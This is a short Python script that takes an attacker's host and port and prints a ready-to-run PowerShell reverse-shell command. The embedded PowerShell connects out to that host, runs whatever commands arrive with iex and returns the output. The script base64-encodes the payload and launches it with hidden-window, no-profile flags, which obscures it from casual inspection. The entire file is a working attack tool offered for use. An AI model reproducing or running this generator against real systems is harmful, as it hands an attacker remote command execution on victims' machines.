import sys
import base64

if len(sys.argv) == 3:
    lhost = sys.argv[1]
    lport = sys.argv[2]

else:
    print("wrong arguments")
    exit()

payload = '$client = New-Object System.Net.Sockets.TCPClient("'+str(lhost)+'",'+str(lport)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -enc " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)